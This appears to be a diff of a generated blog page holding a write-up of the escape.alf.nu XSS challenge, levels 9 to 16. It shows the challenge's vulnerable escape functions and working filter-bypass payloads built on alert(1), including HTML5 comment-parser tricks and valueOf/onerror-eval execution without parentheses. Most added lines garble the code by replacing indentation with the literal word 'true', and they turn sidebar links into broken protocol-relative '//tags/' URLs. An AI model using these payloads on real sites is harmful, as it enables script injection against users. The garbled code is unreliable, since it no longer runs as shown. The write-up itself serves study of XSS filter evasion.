@@ -95,7 +95,7 @@
 
 <h2 id="原文">原文</h2>
 <h3 id="Level_9:">Level 9:</h3>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{</span></span></div><div class="line">	<span class="comment">// This is sort of a spoiler for the last level :-)</span></div><div class="line">	<span class="keyword">if</span> (<span class="regexp">/[\\&lt;&gt;]/</span>.test(s)) <span class="keyword">return</span> <span class="string">'-'</span>;</div><div class="line">	<span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s.toUpperCase() + <span class="string">'")</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>';</div><div class="line">}</div></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{</div><div class="line"><span class="literal">true</span><span class="comment">// This is sort of a spoiler for the last level :-)</span></div><div class="line">trueif (<span class="regexp">/[\\&lt;&gt;]/</span>.test(s)) <span class="keyword">return</span> <span class="string">'-'</span>;</div><div class="line">truereturn <span class="string">'&lt;script&gt;console.log("'</span> + s.toUpperCase() + <span class="string">'")&lt;/script&gt;'</span>;</div><div class="line">}</div></pre></td></tr></table></figure>
 
 <p>Some as level 8 but now we cannot use angle brackets (&lt;&gt;) nor backslashes ()</p>
 <p>Solutions:</p>
@@ -166,7 +166,7 @@
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">with</span><span class="params">(<span class="number">0</span>)</span> <span class="title">x</span>=[].<span class="title">sort</span>,<span class="title">x</span><span class="params">()</span></span></div></pre></td></tr></table></figure>
 
 <h3 id="Level_10:">Level 10:</h3>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> {</span></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">htmlEscape</span><span class="params">(s)</span> {</span></div><div class="line">		<span class="keyword">return</span> <span class="transposed_variable">s.</span>replace(/./g, <span class="function"><span class="keyword">function</span><span class="params">(x)</span> {</span></div><div class="line">		<span class="keyword">return</span> { <span class="string">'&lt;'</span>: <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>: <span class="string">'&gt;'</span>, <span class="string">'&'</span>: <span class="string">'&'</span>, <span class="string">'"</span><span class="string">': '</span><span class="string">"'</span>, <span class="string">"'</span><span class="string">": '''</span> }<span class="matrix">[x]</span> || x;</div><div class="line">	 });</div><div class="line">}</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">expandTemplate</span><span class="params">(template, args)</span> {</span></div><div class="line">	<span class="keyword">return</span> <span class="transposed_variable">template.</span>replace( /{(\w+)}/g,</div><div class="line">	<span class="function"><span class="keyword">function</span><span class="params">(_, n)</span> {</span></div><div class="line">		<span class="keyword">return</span> htmlEscape(args<span class="matrix">[n]</span>);</div><div class="line">	});</div><div class="line">}</div><div class="line">	<span class="keyword">return</span> expandTemplate(</div><div class="line">		<span class="string">" \n\</span></div><div class="line">   			&lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt; \n\</div><div class="line">		 &lt;script&gt; \n\</div><div class="line">			var v = document.getElementById('<span class="transposed_variable">name'</span>); \n\</div><div class="line">			<span class="transposed_variable">v.</span>innerHTML = <span class="string">'&lt;a href=#&gt;{name}&lt;/a&gt;'</span>; \n\</div><div class="line">		&lt;\/script&gt; \n\</div><div class="line">  			 <span class="string">",</span></div><div class="line">  			 { name : s }</div><div class="line">   		);</div><div class="line">  	 }</div></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">function escape(s) {</div><div class="line">truefunction htmlEscape(s) {</div><div class="line">truetruereturn s.replace(/./g, function(x) {</div><div class="line">truetruereturn { '&lt;': '&lt;', '&gt;': '&gt;', '&': '&', '<span class="string">"': '"</span>', <span class="string">"'"</span>: ''' }[x] || x;</div><div class="line"><span class="literal">true</span> });</div><div class="line">}</div><div class="line">function expandTemplate(<span class="keyword">template</span>, args) {</div><div class="line">truereturn <span class="keyword">template</span>.replace( /{(\w+)}/g,</div><div class="line">truefunction(_, n) {</div><div class="line">truetruereturn htmlEscape(args[n]);</div><div class="line"><span class="literal">true</span>});</div><div class="line">}</div><div class="line">truereturn expandTemplate(</div><div class="line"><span class="string">truetrue" \n\</span></div><div class="line">   			&lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt; \n\</div><div class="line">truetrue &lt;script&gt; \n\</div><div class="line">truetruetruevar v = document.getElementById('name'); \n\</div><div class="line">truetruetruev.innerHTML = '&lt;a href=#&gt;{name}&lt;/a&gt;'; \n\</div><div class="line">truetrue&lt;\/script&gt; \n\</div><div class="line">  			 ",</div><div class="line">  			 { name : s }</div><div class="line">   		);</div><div class="line">  	 }</div></pre></td></tr></table></figure>
 
 <p>Injection takes place in a JS string context and since “\” is not escaped in the htmlEscape function, we can use hex or octal encoding for the “&lt;” symbol and bypass the escaping function.</p>
 <p>Valid solutions:</p>
@@ -179,7 +179,7 @@
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="tag">&lt;/&lt;/<span class="attribute">scriptscript</span>&gt;</span><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="number">1</span>)<span class="comment">//</span></span></span></div></pre></td></tr></table></figure>
 
 <h3 id="Level_12:">Level 12:</h3>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{</span></span></div><div class="line">	<span class="comment">// Pass inn "callback#userdata"</span></div><div class="line">	<span class="keyword">var</span> thing = s.split(<span class="regexp">/#/</span>);</div><div class="line">	<span class="keyword">if</span> (!<span class="regexp">/^[a-zA-Z\[\]']*$/</span>.test(thing[<span class="number">0</span>])) <span class="keyword">return</span> <span class="string">'Invalid callback'</span>;</div><div class="line">	<span class="keyword">var</span> obj = {<span class="string">'userdata'</span>: thing[<span class="number">1</span>] };</div><div class="line">	<span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(obj).replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>);</div><div class="line">	<span class="keyword">return</span> <span class="string">"&lt;script&gt;"</span> + thing[<span class="number">0</span>] + <span class="string">"("</span> + json +<span class="string">")</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>";</div><div class="line">}</div></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{</span></span></div><div class="line"><span class="literal">true</span><span class="comment">// Pass inn "callback#userdata"</span></div><div class="line">truevar thing = s.split(<span class="regexp">/#/</span>);</div><div class="line">trueif (!<span class="regexp">/^[a-zA-Z\[\]']*$/</span>.test(thing[<span class="number">0</span>])) <span class="keyword">return</span> <span class="string">'Invalid callback'</span>;</div><div class="line">truevar obj = {<span class="string">'userdata'</span>: thing[<span class="number">1</span>] };</div><div class="line">truevar json = <span class="built_in">JSON</span>.stringify(obj).replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>);</div><div class="line">truereturn <span class="string">"&lt;script&gt;"</span> + thing[<span class="number">0</span>] + <span class="string">"("</span> + json +<span class="string">")</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>";</div><div class="line">}</div></pre></td></tr></table></figure>
 
 <p>Similar to level 7 but this time the backslash is also escaped so we use a similar vector with a different way to comment the junk out:</p>
 <p>Solution:</p>
@@ -196,7 +196,7 @@
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=<span class="string">'youWon'</span></div></pre></td></tr></table></figure>
 
 <h3 id="Level_14:">Level 14:</h3>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">   	<span class="doctype">&lt;!DOCTYPE HTML&gt;</span></div><div class="line">function escape(s) {</div><div class="line">	function json(s) { </div><div class="line">		return JSON.stringify(s).replace(/\//g, '\\/'); </div><div class="line">	}</div><div class="line"></div><div class="line">	function html(s) { </div><div class="line">		return s.replace(/[<span class="tag">&lt;&gt;</span>"&]/g, function(s) {</div><div class="line">			return '&#' + s.charCodeAt(0) + ';'; </div><div class="line">		}); </div><div class="line">	}</div><div class="line">	return (</div><div class="line">		'<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="string">' +</span></span></div><div class="line">			'<span class="keyword">var</span> url = <span class="string">' + json(s) + '</span>; </div><div class="line">			<span class="comment">// We\'ll use this later ' + '</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>\n\n' +</div><div class="line">			' <span class="comment">&lt;!-- for debugging --&gt;</span>\n' +</div><div class="line">			' URL: ' + html(s) + '\n\n' +</div><div class="line">			'<span class="comment">&lt;!-- then suddenly --&gt;</span>\n' +</div><div class="line">			'<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">\n<span class="string">' +</span></span></div><div class="line">			' <span class="keyword">if</span> (!<span class="regexp">/^http:.*/</span>.test(url)) <span class="built_in">console</span>.log(<span class="string">"Bad url: "</span> + url);\n<span class="string">' +</span></div><div class="line">			' <span class="keyword">else</span> <span class="keyword">new</span> Image().src = url;\n<span class="string">' +</span></div><div class="line">		'<span class="tag">&lt;/<span class="title">script</span>&gt;</span>'</div><div class="line">		);</div><div class="line">   	}</div></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">   	<span class="doctype">&lt;!DOCTYPE HTML&gt;</span></div><div class="line">function escape(s) {</div><div class="line">truefunction json(s) { </div><div class="line">truetruereturn JSON.stringify(s).replace(/\//g, '\\/'); </div><div class="line">true}</div><div class="line"></div><div class="line">truefunction html(s) { </div><div class="line">truetruereturn s.replace(/[<span class="tag">&lt;&gt;</span>"&]/g, function(s) {</div><div class="line">truetruetruereturn '&#' + s.charCodeAt(0) + ';'; </div><div class="line">truetrue}); </div><div class="line">true}</div><div class="line">truereturn (</div><div class="line">truetrue'<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="string">' +</span></span></div><div class="line">truetruetrue'<span class="keyword">var</span> url = <span class="string">' + json(s) + '</span>; </div><div class="line">truetruetrue<span class="comment">// We\'ll use this later ' + '</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>\n\n' +</div><div class="line">truetruetrue' <span class="comment">&lt;!-- for debugging --&gt;</span>\n' +</div><div class="line">truetruetrue' URL: ' + html(s) + '\n\n' +</div><div class="line">truetruetrue'<span class="comment">&lt;!-- then suddenly --&gt;</span>\n' +</div><div class="line">truetruetrue'<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">\n<span class="string">' +</span></span></div><div class="line">truetruetrue' <span class="keyword">if</span> (!<span class="regexp">/^http:.*/</span>.test(url)) <span class="built_in">console</span>.log(<span class="string">"Bad url: "</span> + url);\n<span class="string">' +</span></div><div class="line">truetruetrue' <span class="keyword">else</span> <span class="keyword">new</span> Image().src = url;\n<span class="string">' +</span></div><div class="line">truetrue'<span class="tag">&lt;/<span class="title">script</span>&gt;</span>'</div><div class="line">truetrue);</div><div class="line">   	}</div></pre></td></tr></table></figure>
 
 <p>In order to solve this level we need to be familiar with an HTML5 parser “feature” when dealing with comments in JS blocks. This feature is well described in this post (thanks for the hint @cgvwzq !).</p>
 <p>The trick is that injecting an HTML5 single line comment “!—” followed by a “”script”” open tag will move the parser into the “script data double escaped state” until the closing script tag is found and then it will transition into “ script data escaped state ” and it will treat anything from the end of the string where we injected the “”!—“scrip”” as JS! only thing we need to do is making sure there is a “—&gt;” so that the parser does not throw an invalid syntax exception.</p>
@@ -207,16 +207,16 @@
 <p>The resulting code will be:</p>
 <p><img src="http://evilddog.qiniudn.com/escape.alf.nu_3.png" alt=""></p>
 <p>Now if we clean it up and remove the comments (in grey):</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span></div><div class="line">	<span class="keyword">var</span> url = <span class="string">"alert(1);\/*&lt;!--&lt;script&gt;*\/if(\/a\/\/*"</span>;</div><div class="line">	URL: alert(<span class="number">1</span>); <span class="keyword">if</span>(<span class="regexp">/a/</span>.test(url)) <span class="built_in">console</span>.log(<span class="string">"Bad url: "</span> + url);</div><div class="line"> <span class="keyword">else</span> <span class="keyword">new</span> Image().src = url;</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span></div><div class="line">truevar url = <span class="string">"alert(1);\/*&lt;!--&lt;script&gt;*\/if(\/a\/\/*"</span>;</div><div class="line">trueURL: alert(<span class="number">1</span>); <span class="keyword">if</span>(<span class="regexp">/a/</span>.test(url)) <span class="built_in">console</span>.log(<span class="string">"Bad url: "</span> + url);</div><div class="line"> <span class="keyword">else</span> <span class="keyword">new</span> Image().src = url;</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>
 
 <p>We can get it even shorter with:</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(alert(<span class="number">1</span>)/*&lt;!<span class="comment">--&lt;script&gt;</span></div></pre></td></tr></table></figure>
 
 <p>This will turn into:</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span></div><div class="line">	<span class="keyword">var</span> url = <span class="string">"alert(1);\/*&lt;!--&lt;script&gt;*\/if(\/a\/\/*"</span>;</div><div class="line">	URL: <span class="keyword">if</span>(alert(<span class="number">1</span>).test(url)) <span class="built_in">console</span>.log(<span class="string">"Bad url: "</span> + url);</div><div class="line">	<span class="keyword">else</span> <span class="keyword">new</span> Image().src = url;</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span></div><div class="line">truevar url = <span class="string">"alert(1);\/*&lt;!--&lt;script&gt;*\/if(\/a\/\/*"</span>;</div><div class="line">trueURL: <span class="keyword">if</span>(alert(<span class="number">1</span>).test(url)) <span class="built_in">console</span>.log(<span class="string">"Bad url: "</span> + url);</div><div class="line">trueelse <span class="keyword">new</span> Image().src = url;</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>
 
 <h3 id="Level_15:">Level 15:</h3>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{</div><div class="line">	<span class="keyword">return</span> s.split(<span class="string">'#'</span>).map(<span class="function"><span class="keyword">function</span><span class="params">(v)</span> </span>{</div><div class="line">		<span class="comment">// Only 20% of slashes are end tags; save 1.2% of total</span></div><div class="line">		<span class="comment">// bytes by only escaping those.</span></div><div class="line">		<span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(v).replace(<span class="regexp">/&lt;\//g</span>, <span class="string">'&lt;\\/'</span>);</div><div class="line">		<span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span>+json+<span class="string">')&lt;/script&gt;'</span>;</div><div class="line">	}).join(<span class="string">''</span>);</div><div class="line">}</div></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{</div><div class="line">truereturn s.split(<span class="string">'#'</span>).map(<span class="function"><span class="keyword">function</span><span class="params">(v)</span> </span>{</div><div class="line">truetrue<span class="comment">// Only 20% of slashes are end tags; save 1.2% of total</span></div><div class="line">truetrue<span class="comment">// bytes by only escaping those.</span></div><div class="line">truetruevar json = <span class="built_in">JSON</span>.stringify(v).replace(<span class="regexp">/&lt;\//g</span>, <span class="string">'&lt;\\/'</span>);</div><div class="line">truetruereturn <span class="string">'&lt;script&gt;console.log('</span>+json+<span class="string">')&lt;/script&gt;'</span>;</div><div class="line"><span class="literal">true</span>}).join(<span class="string">''</span>);</div><div class="line">}</div></pre></td></tr></table></figure>
 
 <p>We can use the same trick we used for level 14. We can start with something simple like:</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload1<span class="comment">#payload2</span></div></pre></td></tr></table></figure>
@@ -239,18 +239,18 @@
 <p>Actually you can see in the console that the first console.log writes ‘&lt;!—“script”’</p>
 <p>In order to make it even shorter we can replace “//” with unicode \u2028 as suggested by Mario</p>
 <h3 id="Level_16:">Level 16:</h3>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(text)</span> </span>{</div><div class="line">	<span class="comment">// *cough* not done</span></div><div class="line">	<span class="keyword">var</span> i = <span class="number">0</span>;</div><div class="line">	<span class="built_in">window</span>.the_easy_but_expensive_way_out = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>{ alert(i++) };</div><div class="line">	<span class="comment">// "A JSON text can be safely passed into JavaScript's eval() function</span></div><div class="line">	<span class="comment">// (which compiles and executes a string) if all the characters not</span></div><div class="line">	<span class="comment">// enclosed in strings are in the set of characters that form JSON</span></div><div class="line">	<span class="comment">// tokens."</span></div><div class="line">	<span class="keyword">if</span> (!(<span class="regexp">/[^,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]/</span>.test(</div><div class="line"> text.replace(<span class="regexp">/"(\\.|[^"\\])*"/g</span>, <span class="string">''</span>)))) {</div><div class="line">		<span class="keyword">try</span> {</div><div class="line">		<span class="keyword">var</span> val = <span class="built_in">eval</span>(<span class="string">'('</span> + text + <span class="string">')'</span>);</div><div class="line">		<span class="built_in">console</span>.log(<span class="string">''</span> + val);</div><div class="line">		} <span class="keyword">catch</span> (_) {</div><div class="line">		 <span class="built_in">console</span>.log(<span class="string">'Crashed: '</span>+_);</div><div class="line">			}	</div><div class="line">		} <span class="keyword">else</span> {</div><div class="line">	<span class="built_in">console</span>.log(<span class="string">'Rejected.'</span>);</div><div class="line">	}</div><div class="line">}</div></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(text)</span> </span>{</div><div class="line"><span class="literal">true</span><span class="comment">// *cough* not done</span></div><div class="line">truevar i = <span class="number">0</span>;</div><div class="line">truewindow.the_easy_but_expensive_way_out = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>{ alert(i++) };</div><div class="line"><span class="literal">true</span><span class="comment">// "A JSON text can be safely passed into JavaScript's eval() function</span></div><div class="line"><span class="literal">true</span><span class="comment">// (which compiles and executes a string) if all the characters not</span></div><div class="line"><span class="literal">true</span><span class="comment">// enclosed in strings are in the set of characters that form JSON</span></div><div class="line"><span class="literal">true</span><span class="comment">// tokens."</span></div><div class="line">trueif (!(<span class="regexp">/[^,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]/</span>.test(</div><div class="line"> text.replace(<span class="regexp">/"(\\.|[^"\\])*"/g</span>, <span class="string">''</span>)))) {</div><div class="line">truetruetry {</div><div class="line">truetruevar val = <span class="built_in">eval</span>(<span class="string">'('</span> + text + <span class="string">')'</span>);</div><div class="line">truetrueconsole.log(<span class="string">''</span> + val);</div><div class="line">truetrue} <span class="keyword">catch</span> (_) {</div><div class="line">truetrue <span class="built_in">console</span>.log(<span class="string">'Crashed: '</span>+_);</div><div class="line">truetruetrue}	</div><div class="line">truetrue} <span class="keyword">else</span> {</div><div class="line">trueconsole.log(<span class="string">'Rejected.'</span>);</div><div class="line"><span class="literal">true</span>}</div><div class="line">}</div></pre></td></tr></table></figure>
 
 <p>This level is based on a real world filter described by Stefano Di Paola in this post</p>
 <p>If we study the regexp carefully we will see that the letter “s” is allowed since its within the “u-r” interval, that allows us to use the word “self” and with that we can craft a valid JSON payload. The trick is that we will be adding “0” to our object so the JS engine will need to calculate the valueOf our object. So if we define the “valueOf” function as the “the_easy_but_expensive_way_out” global function, we will be able to invoke it during the arithmetic operation. The problem is that it will alert “0” since “i” its initialized with “0”, but we can do it twice to alert a “1”.</p>
 <p>Long Solution:</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">{	</div><div class="line">	<span class="string">"valueOf"</span><span class="symbol">:self</span>[<span class="string">"the_easy_but_expensive_way_out"</span>]</div><div class="line">}+<span class="number">0</span>,</div><div class="line">	<span class="string">"valueOf"</span><span class="symbol">:self</span>[<span class="string">"the_easy_but_expensive_way_out"</span>]</div><div class="line">}</div></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">{	</div><div class="line"><span class="keyword">true</span><span class="string">"valueOf"</span><span class="symbol">:self</span>[<span class="string">"the_easy_but_expensive_way_out"</span>]</div><div class="line">}+<span class="number">0</span>,</div><div class="line"><span class="keyword">true</span><span class="string">"valueOf"</span><span class="symbol">:self</span>[<span class="string">"the_easy_but_expensive_way_out"</span>]</div><div class="line">}</div></pre></td></tr></table></figure>
 
 <p>That is a nice trick to execute a function when parenthesis are not allowed. But there some more like Gareth famous one:</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">onerror=<span class="built_in">eval</span>;<span class="keyword">throw</span>[<span class="string">'=1;alert\x281\x29'</span>]</div></pre></td></tr></table></figure>
 
 <p>You can get a shorter solution for IE only as explained by Stefano Di Paola in his post</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">{</div><div class="line">	<span class="string">"valueOf"</span><span class="symbol">:self</span>[<span class="string">"location"</span>],<span class="string">"toString"</span><span class="symbol">:[]</span>[<span class="string">"join"</span>],</div><div class="line">	<span class="number">0</span><span class="symbol">:<span class="string">"javascript:alert(1)"</span></span>,<span class="string">"length"</span><span class="symbol">:</span><span class="number">1</span></div><div class="line">}</div></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">{</div><div class="line">true"valueOf":self[<span class="link_label">"location"</span>],"toString":[]["join"],</div><div class="line">true0:"javascript:alert(1)","length":1</div><div class="line">}</div></pre></td></tr></table></figure>
 
 <p>And thats all folks, thanks for reading!</p>
 <h2 id="Part1"><a href="http://evilddog.github.io/2014/10/12/escape-alf-nu-write-ups-2/" target="_blank" rel="external">Part1</a></h2>
@@ -385,25 +385,25 @@
   <h3 class="title">标签</h3>
   <ul class="entry">
   
-    <li><a href="/tags/BackBox/">BackBox</a><small>1</small></li>
+    <li><a href="//tags/BackBox/">BackBox</a><small>1</small></li>
   
-    <li><a href="/tags/HTTP/">HTTP</a><small>1</small></li>
+    <li><a href="//tags/HTTP/">HTTP</a><small>1</small></li>
   
-    <li><a href="/tags/HTTPS/">HTTPS</a><small>1</small></li>
+    <li><a href="//tags/HTTPS/">HTTPS</a><small>1</small></li>
   
-    <li><a href="/tags/Life/">Life</a><small>1</small></li>
+    <li><a href="//tags/Life/">Life</a><small>1</small></li>
   
-    <li><a href="/tags/Nmap/">Nmap</a><small>1</small></li>
+    <li><a href="//tags/Nmap/">Nmap</a><small>1</small></li>
   
-    <li><a href="/tags/XSS/">XSS</a><small>2</small></li>
+    <li><a href="//tags/XSS/">XSS</a><small>2</small></li>
   
-    <li><a href="/tags/curl/">curl</a><small>1</small></li>
+    <li><a href="//tags/curl/">curl</a><small>1</small></li>
   
-    <li><a href="/tags/png/">png</a><small>1</small></li>
+    <li><a href="//tags/png/">png</a><small>1</small></li>
   
-    <li><a href="/tags/write-up/">write-up</a><small>1</small></li>
+    <li><a href="//tags/write-up/">write-up</a><small>1</small></li>
   
-    <li><a href="/tags/同源策略/">同源策略</a><small>1</small></li>
+    <li><a href="//tags/同源策略/">同源策略</a><small>1</small></li>
   
   </ul>
 </div>
@@ -414,19 +414,19 @@
   <h3 class="title">分类</h3>
   <ul class="entry">
   
-    <li><a href="/categories/CTF/">CTF</a><small>2</small></li>
+    <li><a href="//categories/CTF/">CTF</a><small>2</small></li>
   
-    <li><a href="/categories/HTTP/">HTTP</a><small>2</small></li>
+    <li><a href="//categories/HTTP/">HTTP</a><small>2</small></li>
   
-    <li><a href="/categories/Linux/">Linux</a><small>1</small></li>
+    <li><a href="//categories/Linux/">Linux</a><small>1</small></li>
   
-    <li><a href="/categories/Tools/">Tools</a><small>2</small></li>
+    <li><a href="//categories/Tools/">Tools</a><small>2</small></li>
   
-    <li><a href="/categories/前端安全/">前端安全</a><small>2</small></li>
+    <li><a href="//categories/前端安全/">前端安全</a><small>2</small></li>
   
-    <li><a href="/categories/浏览器安全/">浏览器安全</a><small>1</small></li>
+    <li><a href="//categories/浏览器安全/">浏览器安全</a><small>1</small></li>
   
